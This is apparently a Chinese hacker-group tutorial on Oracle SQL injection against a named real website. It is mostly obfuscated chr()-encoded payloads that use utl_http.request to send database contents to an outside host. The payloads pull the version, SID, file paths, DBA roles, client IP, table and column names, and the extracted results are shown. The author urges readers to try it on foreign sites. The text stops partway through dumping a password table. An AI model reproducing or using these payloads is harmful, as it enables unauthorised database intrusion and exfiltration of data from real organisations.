@@ -1,0 +1,509 @@
+    --------------欢迎加入------中国红客联盟--------------
+
+http://www.e521.com/2010/newsContent.jsp?gid=602
+
+order by 7正常，8出错，那就是7的字段。
+
+但是他不会显示在哪个位置
+
+http://www.e521.com/admin/login.do
+
+中国红客联盟08小组  Ｈ.Ｕ.Ｃ—枫   ^-^
+
+    本来和TNT说了前两天做个oracle+jsp的教程，由于时间关系没做成...顺便测试下这个在线课堂。
+
+因为这次测试的站点是国内的，希望不要去搞破坏，搞破坏不是好同学...你们可以去找些国外的站来测试。
+
+let's go！ ketao话就不说了吧。先看下这些语句。。。
+
+老规距先看下了工具的测试效果  ^-^
+
+and union all select null,null,null,null,null,null,null from dual  也是七个null，oracle不会自动转换数据类型。支持null 不能用
+and union select 1,2,3,4,5  这种是不行的。
+他联合查询的时候必须要带from  这和mysql不一样。
+
+问题就在这，不能知道字段位置，不知道他有些什么样的表，就不能猜他的ASC码一个一个猜了。一般都是几百个表在里面。
+那就用我们下面要讲的，ult_http包来猜 。本来穿山甲那个工具是有这个攻能的，但没有猜列的攻能。
+
+一片空白。。。版本也没有，用户名也没有，sid也没有
+
+
+Database Version版本信息：看下版本。
+
+http://www.nosec.org/product/oracle_info.txt 穿山甲官网。 他的信息就是返回这个文件里了。
+
+统计条数：  5 条记录。
+
+ or chr(91) in (select utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select count(*) from v$version where 1=1)) from dual) and 1=1 
+
+utl_http.request
+
+v$version爆版本信息。
+
+第一条：
+ or chr(91) in (select utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select a from (select rownum r,a from (select rownum r, rawtohex(banner) as a from v$version where rownum%3C=1 and 1=1 order by 1 desc)t where r%3E1-1 order by 1)t)) from dual) and 1=1
+
+Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production  版本信息。
+第二条只要改两处位置。
+
+rownum%3C=1 <1     %3C=1  //  <=1   r%3E1-1 >0  r是rownum的别名。>0  oracle rownum 这就是1了<1
+
+
+rawtohex 转换成16进制。rownum  分条显示。
+
+
+第二条：
+ or chr(91) in (select utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select a from (select rownum r,a from (select rownum r, rawtohex(banner) as a from v$version where rownum%3C=2 and 1=1 order by 1 desc)t where r%3E2-1 order by 1)t)) from dual) and 1=1
+
+PL/SQL Release 9.2.0.1.0 - Production 
+  CORE	9.2.0.1.0	Production
+  第三条了：
+
+再来看下data名：
+
+Database Name  数据裤名：E521CDK
+ or chr(91) in (select utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select rawtohex(name) from v$database where rownum=1 and 1=1)) from dual) and 1=1
+
+instance_name sid登陆数据裤要用的：  E521CDK  sid这个登陆裤要用的。
+
+ or chr(91) in (select utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select rawtohex(name) from v$database where rownum=1 and 1=1)) from dual) and 1=1
+
+service_names服务器名： 这些我就勿了吧，步数一样的，放进去执行下，更新，txt文件就可以了。
+统计：   
+ or chr(91) in (select utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select count(*) from v$parameter where name=chr(115)%7C%7Cchr(101)%7C%7Cchr(114)%7C%7Cchr(118)%7C%7Cchr(105)%7C%7Cchr(99)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(110)%7C%7Cchr(97)%7C%7Cchr(109)%7C%7Cchr(101)%7C%7Cchr(115))) from dual) and 1=1 
+
+统计有多少个记录
+
+
+第一条：
+ or chr(91) in (select utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select a from (select rownum r,a from (select rownum r, rawtohex(value) as a from v$parameter where rownum%3C=1 and name=chr(115)%7C%7Cchr(101)%7C%7Cchr(114)%7C%7Cchr(118)%7C%7Cchr(105)%7C%7Cchr(99)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(110)%7C%7Cchr(97)%7C%7Cchr(109)%7C%7Cchr(101)%7C%7Cchr(115) order by 1 desc)t where r%3E1-1 order by 1)t)) from dual) and 1=1
+
+v$parameter   存在着，sid，control_files
+ 都是通过他来爆的。
+
+
+control_files：loc文件目录，可以来判断操作系统  看下他的系统是什么的。
+
+ or chr(91) in (select utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select a from (select rownum r,a from (select rownum r, rawtohex(value) as a from v$parameter where rownum%3C=1 and name=chr(99)%7C%7Cchr(111)%7C%7Cchr(110)%7C%7Cchr(116)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(108)%7C%7Cchr(95)%7C%7Cchr(102)%7C%7Cchr(105)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(115) order by 1 desc)t where r%3E1-1 order by 1)t)) from dual) and 1=1
+
+E:\oracle\oradata\E521CDK\CONTROL01.CTL, E:\oracle\oradata\E521CDK\CONTROL02.CTL, E:\oracle\oradata\E521CDK\CONTROL03.CTL  windows系统
+
+
+就是通过这个了
+
+User Name 用户名;  数据裤用户名，
+ or chr(91) in (select utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select rawtohex(user) from user_tables where rownum=1 and 1=1)) from dual) and 1=1
+
+USER_ROLE_PRIVS 权限： 判断权限，dba是最高权限，如果没另外设计的放是可以直接执行cmd的
+统计：
+ or chr(91) in (select utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select count(*) from user_role_privs where 1=1)) from dual) and 1=1 
+
+5
+条记录，角色不一样。
+
+AQ_ADMINISTRATOR_ROLE       
+DBA    还有sys system都是系统级的
+JAVASYSPRIV
+JAVAUSERPRIV
+SALES_HISTORY_ROLE    user_role_privs  用他来爆权限。
+
+第一条：
+ or chr(91) in (select utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select a from (select rownum r,a from (select rownum r, rawtohex(granted_role) as a from user_role_privs where rownum%3C=1 and 1=1 order by 1 desc)t where r%3E1-1 order by 1)t)) from dual) and 1=1
+
+连接ip:
+ or chr(91) in (select utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select rawtohex(sys_context(chr(117)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(114)%7C%7Cchr(101)%7C%7Cchr(110)%7C%7Cchr(118),chr(105)%7C%7Cchr(112)%7C%7Cchr(95)%7C%7Cchr(97)%7C%7Cchr(100)%7C%7Cchr(100)%7C%7Cchr(114)%7C%7Cchr(101)%7C%7Cchr(115)%7C%7Cchr(115))) from dual where rownum=1 and 1=1)) from dual) and 1=1
+
+Tables 表名： 接下来爆表了。
+
+统计：
+ or chr(91) in (select utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select count(*) from user_tables where 1=1)) from dual) and 1=1
+
+253个表，这还算是少的，一般都600-700个表。要是一个一个弄要弄死人。
+
+
+第一条：
+ or chr(91) in (select utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select a from (select rownum r,a from (select rownum r, rawtohex(table_name) as a from user_tables where rownum%3C=1 and 1=1 order by 1 desc)t where r%3E1-1 order by 1)t)) from dual) and 1=1
+
+AFFICHE  第二条和刚才前面一样改两处。第三条就改成三
+
+
+rownum r  的是rownum的别名。
+
+http://space.itpub.net/10768286/viewspace-672069   没有一点基础怕是理解有点吃力。
+
+
+第二条：
+ or chr(91) in (select utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select a from (select rownum r,a from (select rownum r, rawtohex(table_name) as a from user_tables where rownum%3C=2 and 1=1 order by 1 desc)t where r%3E2-1 order by 1)t)) from dual) and 1=1
+
+
+
+爆列名：这个是我自己整出来的，穿山甲上没有这个攻能。
+
+统计列数： 如admin=table_name=chr(65)%7C%7Cchr(68)%7C%7Cchr(77)%7C%7Cchr(73)%7C%7Cchr(78)
+
+ or chr(91) in (select utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select count(*) from user_tab_columns where table_name=chr(65)%7C%7Cchr(68)%7C%7Cchr(77)%7C%7Cchr(73)%7C%7Cchr(78))) from dual) and 1=1
+
+
+ table_name=表名=ASC码  7有七列。   
+
+ 爆列名：
+                     先看下我早整出来的表，找个来爆他。
+ 第一个列名：
+
+ and UTL_HTTP.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select COLUMN_NAME from COLS where table_name=chr(65)%7C%7Cchr(68)%7C%7Cchr(77)%7C%7Cchr(73)%7C%7Cchr(78) and rownum=1))=1--
+
+COLUMN_NAME 列名
+
+ID
+
+
+
+
+第二列，有两种语句，and column_name<>'ID'  和，and column_name not in ('ID') 个人习惯不一样
+
+and UTL_HTTP.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select COLUMN_NAME from COLS where table_name=chr(65)%7C%7Cchr(68)%7C%7Cchr(77)%7C%7Cchr(73)%7C%7Cchr(78) and rownum=1 and column_name not in ('ID')))=1--       
+   放在这里。爆第二列。not in就是不包括，这些T_SQL里就有讲过的。
+USERID
+
+第三列。。。 and column_name not in ('ID','USERID')  英文下的符号。
+
+and%20column_name%20not%20in%20('PID','USERID','PWD')  这样类推。。
+
+爆内容：爆内容  看下这个PWDS表下有多少条记录。
+
+统计记录条数：
+ and 